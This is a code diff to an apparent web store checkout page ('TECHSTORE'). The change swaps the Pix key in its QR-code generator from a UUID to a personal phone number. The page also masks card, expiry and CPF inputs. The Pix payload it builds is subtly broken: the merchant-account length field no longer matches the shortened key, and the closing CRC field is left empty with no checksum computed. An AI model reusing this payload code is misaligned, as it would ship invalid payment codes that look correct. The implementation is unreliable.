@@ -102,27 +102,27 @@ window.onload = function() {
 };
 
 function gerarPixDinamico(valor) {
-    const chave = "5663014b-ba23-4c57-b239-26914c95a8c0";
+    // Chave formatada como telefone (DDI + DDD + Número)
+    const chave = "+5585997831456"; 
     const nome = "TECHSTORE";
-    const cidade = "SAOPAULO"; // CORREÇÃO: Removido o espaço e ajustado para 8 caracteres
+    const cidade = "SAOPAULO";
     const valorStr = valor.toFixed(2).toString();
     
-    // Montagem do payload sem espaços e com contadores exatos
-    let payload = "00020126580014BR.GOV.BCB.PIX0136" + chave + "520400005303986";
+    // Montagem do payload corrigida para telefone
+    let payload = "00020126580014BR.GOV.BCB.PIX0114" + chave + "520400005303986";
     payload += "54" + valorStr.length.toString().padStart(2, '0') + valorStr;
     payload += "5802BR5909" + nome + "6008" + cidade + "62070503***6304";
     
-    // Limpeza final para garantir zero espaços
-    const payloadLimpo = payload.replace(/\s+/g, '');
+    const payloadFinal = payload.replace(/\s+/g, '');
 
     document.getElementById("qrcode-container").innerHTML = "";
     new QRCode(document.getElementById("qrcode-container"), { 
-        text: payloadLimpo, 
+        text: payloadFinal, 
         width: 160, 
         height: 160,
         correctLevel : QRCode.CorrectLevel.M 
     });
-    document.getElementById('pix-copy').innerText = payloadLimpo;
+    document.getElementById('pix-copy').innerText = payloadFinal;
 }
 
 function trocar(m) {
@@ -173,4 +173,4 @@ function mask(id, m) {
 mask('c1', '#### #### #### ####'); mask('c3', '##/##'); mask('c5', '###.###.###-##'); mask('f-cep', '#####-###'); mask('f-tel', '(##) #####-####');
 </script>
 </body>
-   </html>
+</html>
